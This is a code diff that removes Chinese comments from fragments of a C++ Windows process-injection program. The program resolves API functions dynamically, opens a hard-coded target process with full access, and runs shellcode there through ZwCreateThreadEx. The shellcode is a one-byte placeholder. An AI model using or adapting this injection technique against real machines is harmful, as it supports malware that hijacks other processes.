@@ -31,7 +31,7 @@ typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
     LPVOID pUnkown);
 #endif
 
-// 动态获取API函数指针
+
     typedef HMODULE (WINAPI* pGetModuleHandleA)(LPCSTR);
     typedef FARPROC (WINAPI* pGetProcAddress)(HMODULE, LPCSTR);
     typedef HANDLE (WINAPI* pOpenProcess)(DWORD, BOOL, DWORD);
@@ -41,7 +41,7 @@ typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
     typedef BOOL (WINAPI* pVirtualFreeEx)(HANDLE, LPVOID, SIZE_T, DWORD);
 
 int main(int argc, char* argv[]) {
-    // shellcode内容请自行替换
+    
     char shellcode[] = {0x12};
     HANDLE hRemoteThread;
     
@@ -58,7 +58,7 @@ int main(int argc, char* argv[]) {
         std::cout << "API获取失败" << std::endl;
         return -1;
     }
-    DWORD targetPid = 1516; // 替换为目标进程PID
+    DWORD targetPid = 1516; 
     HANDLE hProcess = myOpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
     if (!hProcess) {
         std::cout << "打开目标进程失败" << std::endl;
@@ -83,7 +83,7 @@ int main(int argc, char* argv[]) {
         hProcess,
         (LPTHREAD_START_ROUTINE)lpBaseAddress,
         NULL,
-        0, // 关键：第七参数为0
+        0, 
         0,
         0,
         0,
